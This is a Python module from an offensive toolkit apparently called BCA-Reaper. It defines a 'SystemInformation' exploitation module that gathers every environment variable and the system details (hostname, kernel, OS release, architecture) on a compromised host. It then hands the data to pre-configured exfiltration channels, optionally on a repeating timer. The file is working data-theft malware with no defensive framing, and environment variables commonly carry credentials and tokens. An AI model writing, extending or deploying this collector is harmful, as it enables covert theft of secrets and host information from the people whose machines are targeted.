#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Reaper

__author__ = 'EONRaider @ keybase.io/eonraider'

import json
import os
import platform
import time

from src.modules import ExploitationModule


class SystemInformation(ExploitationModule):
    def __init__(self, *, exfil_time: float = None):
        """Perform a collection of data on the host's system resources
        and send it to pre-configured exfiltration methods.

        :param exfil_time: Time in seconds to wait between periodic
            executions of the exfiltration of logged data. Set to None
            to perform a single operation.
        """
        super().__init__(exfil_time)
        self.sys_info = dict()

    @property
    def contents(self) -> str:
        return json.dumps(self.sys_info)

    def execute(self) -> None:
        """Extract information from the host, including environment
        variables and system configuration data such as kernel version,
        hostname, OS release name, OS release version and processor
        architecture."""
        while True:
            self.sys_info = {
                "environment": {env: value for env, value in os.environ.items()}
            }
            self.sys_info |= platform.uname()._asdict()
            self._notify_all_exfiltrators(message=self.report())
            try:
                time.sleep(self.exfil_time)
            except TypeError:
                break
